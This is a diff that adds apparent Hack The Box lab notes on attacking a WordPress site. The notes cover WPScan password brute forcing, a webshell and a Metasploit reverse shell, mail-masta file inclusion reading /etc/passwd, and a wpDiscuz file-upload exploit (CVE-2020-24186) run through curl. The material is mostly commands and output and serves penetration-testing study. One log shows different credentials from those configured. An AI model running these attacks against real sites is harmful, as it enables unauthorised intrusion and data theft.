@@ -142,5 +142,194 @@ Interesting Finding(s):
 ```
 
 
+# Login Bruteforce
+WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it’s faster.
+
+```
+naruto3co@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+
+[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
+[+] Started: Wed Aug 25 11:56:23 2021
+
+<SNIP>
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - john / firebird1                                                                                           
+Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: john, Password: firebird1
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Wed Aug 25 11:56:46 2021
+[+] Requests Done: 799
+[+] Cached Requests: 39
+[+] Data Sent: 373.152 KB
+[+] Data Received: 448.799 KB
+[+] Memory used: 221 MB
+
+[+] Elapsed time: 00:00:23
+```
+The --password-attack flag is used to supply the type of attack. The -U argument takes in a list of users or a file containing user names. This applies to the -P passwords option as well. The -t flag is the number of threads which we can adjust up or down depending. WPScan was able to find valid credentials for one user, john:firebird1.
+
+
+# Code Execution
+<img width="1461" height="868" alt="image" src="https://github.com/user-attachments/assets/18c74ca1-f7fa-4fed-983a-b2ad2fd577a7" />
+```
+naruto3co@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
+
+```
+msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
+
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
+```
+
+We can then issue the show options command to ensure that everything is set up properly. In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error Exploit aborted due to failure: not-found: The target does not appear to be using WordPress.
+```
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting           Required  Description
+   ----       ---------------           --------  -----------
+   PASSWORD   firebird1                 yes       The WordPress password to authenticate with
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.129.42.195             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80                        yes       The target port (TCP)
+   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                         yes       The base path to the wordpress application
+   USERNAME   john                      yes       The WordPress username to authenticate with
+   VHOST      blog.inlanefreight.local  no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+```
+
+Once we are satisfied with the setup, we can type exploit and obtain a reverse shell. From here, we could start enumerating the host for sensitive data or paths for vertical/horizontal privilege escalation and lateral movement.
+```
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Authenticating with WordPress using doug:jessica1...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
+[*] Sending stage (39264 bytes) to 10.129.42.195
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
+i[+] Deleted wCoUuUPfIO.php
+[+] Deleted CczIptSXlr.php
+[+] Deleted ../CczIptSXlr
+
+meterpreter > getuid
+
+Server username: www-data (33)
+```
+
+
+# Leveraging Known Vulnerabilities
+
+Vulnerable Plugins - mail-masta
+Let's look at a few examples. The plugin mail-masta is no longer supported but has had over 2,300 downloads over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an unauthenticated SQL injection and a Local File Inclusion.
+
+Let's take a look at the vulnerable code for the mail-masta plugin.
+```
+<?php 
+
+include($_GET['pl']);
+global $wpdb;
+
+$camp_id=$_POST['camp_id'];
+$masta_reports = $wpdb->prefix . "masta_reports";
+$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");
+
+echo $count[0]->co;
+
+?>
+```
+
+As we can see, the pl parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the /etc/passwd file using cURL.
+```
+naruto3co@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+```
+
+Vulnerable Plugins - wpDiscuz
+wpDiscuz is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over 1.6 million downloads and over 90,000 active installations, making it an extremely popular plugin that we have a very good chance of encountering during an assessment. Based on the version number (7.0.4), this exploit has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. More on the mime type detection functions bypass can be found [here](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/)
+  
+The exploit script takes two parameters: -u the URL and -p the path to a valid post.
+```
+naruto3co@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+
+---------------------------------------------------------------
+[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
+[-] File Upload Bypass Vulnerability - PHP Webshell Upload
+[-] CVE: CVE-2020-24186
+[-] https://github.com/hevox
+--------------------------------------------------------------- 
+
+[+] Response length:[102476] | code:[200]
+[!] Got wmuSecurity value: 5c9398fcdb
+[!] Got wmuSecurity value: 1 
+
+[+] Generating random name for Webshell...
+[!] Generated webshell name: uthsdkbywoxeebg
+
+[!] Trying to Upload Webshell..
+[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 
+
+> id
+
+[x] Failed to execute PHP code...
+```
+
+The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append ?cmd= after the .php extension to run commands which we can see in the exploit script.
+```
+        shellsession
+naruto3co@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+
+GIF689a;
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
+
+
 
 
